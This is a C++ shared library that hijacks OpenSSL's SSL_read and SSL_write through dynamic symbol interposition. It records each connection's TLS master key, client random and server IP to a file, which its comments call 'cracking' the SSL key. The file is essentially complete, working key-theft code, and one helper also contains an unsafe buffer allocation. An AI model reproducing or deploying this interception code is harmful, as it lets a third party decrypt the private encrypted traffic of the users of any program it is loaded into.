#include <iostream>
#include <dlfcn.h>
#include <fstream>
#include <openssl/ssl.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>



#define recordFile "MasterKey.txt"
#define HostName   "HOSTNAME"

using namespace std;


/***SSL Tape State Structure***/
typedef struct sslState
{
	int masterKeyLength ;
	unsigned char MasterKey[SSL_MAX_MASTER_KEY_LENGTH] ;
	
}	sslTapeState ;


/***Argument packet***/
typedef struct Argument
{
	string funcName ;
	const void* buffer ;
	int num ;
	
}	argvPacket ; 


/***Copy SSL state for later usage in crackSSLkey***/
static void sslTapeStateInit(sslTapeState* state, SSL* ssl)
{
	memset(state, 0, sizeof(sslTapeState)) ;
	
	if( ssl->session && ssl->session->master_key_length > 0 )
	{
		state->masterKeyLength = ssl->session->master_key_length ;
		memcpy(state->MasterKey, ssl->session->master_key, ssl->session->master_key_length) ;
	}		
}

/***SSL Tape State Macro***/
#define SSL_TAPE_STATE(state, ssl) \
		sslTapeState state ; \
		sslTapeStateInit(&state, ssl) 

	
/***SymbolTable for looking up the real function***/	
static inline void* SymbolTable(const char* funcSym)
{
	void* realFunc	= dlsym(RTLD_NEXT, funcSym) ;
	
	if( !realFunc )
	{
		void* handle = dlopen("libssl.so", RTLD_LAZY) ;
		
		if( handle != NULL )
			realFunc = dlsym(handle, funcSym) ;
		else
		{
			fprintf(stderr, "%s not found in symbol table", funcSym) ;
			exit(0) ;
		}	
		
		if( !realFunc )
		{
			fprintf(stderr, "Cannot lookup %s", funcSym) ;
			exit(0) ;
		}	
	}	
	return realFunc ;
}


/***Convert hostname to IP address****/
char* hostName2IP(string hostName)
{
	struct hostent* hostentIP ;
	hostentIP = gethostbyname(hostName.c_str()) ;
  
	struct in_addr **Addr_list;
  
	if( hostentIP == 0 ) 
	{
		cerr << "Invalid host name\n" ;
		exit(0) ;
	}
	else
	{
		Addr_list = (struct in_addr **) hostentIP->h_addr_list;
		char* realIP = new char [sizeof(*Addr_list[0])] ;
		strcpy(realIP, inet_ntoa(*Addr_list[0]) );
		return realIP ;
	}	
	
}


/***Convert the integer character to the hex version****/
string printHex(unsigned char* inputArray, int Length)
{
	string hexVersion ;
	for(int i=0; i<Length; i++)
	{
		unsigned char high = inputArray[i] >> 4 ;
		unsigned char low  = inputArray[i] & 0xF ;
		
		char outputHigh = ( high < 10 )? high + '0' : high + 'A' - 10 ;
		char outputLow  = ( low < 10 )? low + '0' : low + 'A' - 10 ;
		hexVersion.push_back(outputHigh) ;
		hexVersion.push_back(outputLow) ;
	}
	
	return hexVersion ;
}
	
	
	
	
/***Record the cracked key into the file***/
static void crackSSLkey(SSL* ssl, sslTapeState* state, argvPacket packet)
{
	if( ssl->s3 != NULL && ssl->session != NULL && ssl->session->master_key_length > 0 )
	{
		if( state->masterKeyLength == ssl->session->master_key_length )
		{
			if( memcmp( state->MasterKey, ssl->session->master_key, state->masterKeyLength ) == 0 ) 
				return ;
		}
	}	
	
	// Key has changed, write to file
	fstream filePointer ;
	filePointer.open(recordFile, ios::out|ios::app) ;
	
	// Dump IP of the host
	string hostName = getenv(HostName) ;
	char* IP = hostName2IP( hostName ) ;	
	filePointer << "Server's IP: " << IP << endl << endl ;
	
	// Dump client's random secret for SSLv3/TLS
	filePointer << "Client's random secret: " << endl ;
	filePointer << printHex(ssl->s3->client_random, SSL3_RANDOM_SIZE) ;
	
	// Dump client's and server's Master key
	filePointer << endl << endl << "The Master Key: " << endl ;
	filePointer << printHex(ssl->session->master_key, ssl->session->master_key_length) ;

	// Dump the extra argument of this operation
	filePointer << endl << endl << "Operation name: " << packet.funcName << endl ;
	filePointer << "The extra arguments are ";
	filePointer << " Buffer: " << packet.buffer ;	
	filePointer << " Num: " << packet.num << endl << endl;
}


/***Hijacking operation: SSL_read***/
int SSL_read(SSL* ssl, void* buf, int num)
{
	static int (*realSSL_read)(SSL*, void*, int) ;
	realSSL_read = (int(*)(SSL*, void*, int))(SymbolTable(__func__)) ;
	SSL_TAPE_STATE(state, ssl) ;
	
	int retVal = realSSL_read(ssl, buf, num) ;
	
	argvPacket readPacket = { __func__, buf, num } ;
	crackSSLkey(ssl, &state, readPacket) ;
	
	return retVal ;
}


/***Hijacking operation: SSL_write***/
int SSL_write(SSL* ssl, const void* buf, int num)
{
	static int (*realSSL_write)(SSL*, const void*, int) ;
	realSSL_write = (int(*)(SSL*, const void*, int))(SymbolTable(__func__)) ;
	SSL_TAPE_STATE(state, ssl) ;
	
	int retVal = realSSL_write(ssl, buf, num) ;
	
	argvPacket writePacket = { __func__, buf, num } ;
	crackSSLkey(ssl, &state, writePacket) ;
	
	return retVal ;
}


